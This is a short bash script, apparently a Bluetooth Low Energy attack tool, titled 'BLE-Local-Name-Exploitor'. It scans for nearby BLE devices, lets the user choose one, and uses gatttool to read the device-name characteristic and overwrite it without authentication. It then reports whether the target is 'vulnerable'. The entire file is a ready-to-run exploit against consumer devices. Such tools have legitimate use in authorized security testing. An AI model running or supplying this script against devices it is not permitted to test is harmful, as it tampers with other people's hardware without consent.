#!/bin/bash

#BLE-Local-Name-Exploitor.sh
#Twitter: @souravbaghz
#Usage: sudo bash exploit.sh 5  /// 5 is 5sec to scan nearby devices.

banner(){
        echo "
█▄▄ █   █▀▀   █▄ █ ▄▀█ █▀▄▀█ █▀▀   █▀▀ ▀▄▀ █▀█ █   █▀█ █ ▀█▀ █▀█ █▀█
█▄█ █▄▄ ██▄   █ ▀█ █▀█ █ ▀ █ ██▄   ██▄ █ █ █▀▀ █▄▄ █▄█ █  █  █▄█ █▀▄"
}

if [ -z "$1" ]
  then
    outtime="2"
else outtime="$1"
fi

start(){
        banner
        echo ""
        echo "[+]Searching Nearby Targets..."
        echo "------------------------------"
        sudo timeout -s SIGINT "$outtime"s hcitool lescan | sort | uniq | head -n -1 >out.txt
    cat out.txt
        echo "------------------------------"
        read -p "[?]TARGET:>" bdaddr
        read -p "[?]New Local Name:>" name
    hexname=$(echo $name | xxd -ps -c 200 | tr -d '\n')

if [ -z "$bdaddr" ]
then
        echo " TARGET not given!"
        echo " Restarting in 2 secs..."
        sleep 2
        #clear
        start
fi
        sudo gatttool -b $bdaddr --char-read --handle=0x0003 > hex1
        current=$(cat hex1 | awk '{ $1=""; $2=""; print}' | xxd -r -p)
        echo ""
        sleep 2
        echo "[-]Current Name is $current"
        echo "[-]Try Writing $name into $bdaddr ..."
        sudo gatttool -b $bdaddr --char-write-req -a 0x0003 -n $hexname > /dev/null 2>&1
        sudo gatttool -b $bdaddr --char-read --handle=0x0003 > hex2
        currentnew=$(cat hex2 | awk '{ $1=""; $2=""; print}' | xxd -r -p)

if [[ $current = $currentnew ]]
        then
        echo "[#]Looks like the device is not Vulnerable!";
        sleep 0.2
        else
        echo "[*]Device name is changed successfully into $currentnew"
        rm -rf hex1 hex2
fi
}

start
